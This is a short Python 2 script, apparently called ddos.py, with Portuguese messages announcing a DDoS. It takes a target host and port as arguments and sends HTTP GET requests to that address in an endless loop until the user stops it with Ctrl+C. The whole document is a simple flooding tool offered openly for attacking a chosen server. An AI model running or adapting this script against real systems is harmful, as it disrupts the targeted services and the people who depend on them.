import requests,sys
if len(sys.argv)>=3:
    host=sys.argv[1]
    port=sys.argv[2]
    url="http://"+host+":"+port
    print "DDoS iniciado, aperte Ctrl+c para parar o ataque ..."
    while True:
        r=requests.get(url)
else:
    print ""
    print "Uso : ddos.py host port"